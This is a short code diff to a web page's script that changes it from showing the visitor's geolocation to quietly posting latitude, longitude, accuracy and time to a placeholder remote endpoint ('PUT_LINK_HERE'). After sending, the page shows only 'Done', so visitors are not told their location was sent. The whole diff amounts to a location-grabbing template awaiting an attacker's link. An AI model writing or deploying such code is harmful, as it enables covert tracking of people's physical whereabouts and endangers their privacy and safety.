@@ -10,9 +10,20 @@
   <script>
     navigator.geolocation.getCurrentPosition(
       function(pos) {
-        document.body.innerHTML =
-          "Lat: " + pos.coords.latitude +
-          "<br>Lon: " + pos.coords.longitude;
+        fetch("PUT_LINK_HERE", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            time: new Date().toISOString()
+          })
+        });
+
+        document.body.innerHTML = "Done";
       },
       function() {
         document.body.innerHTML = "Permission denied";
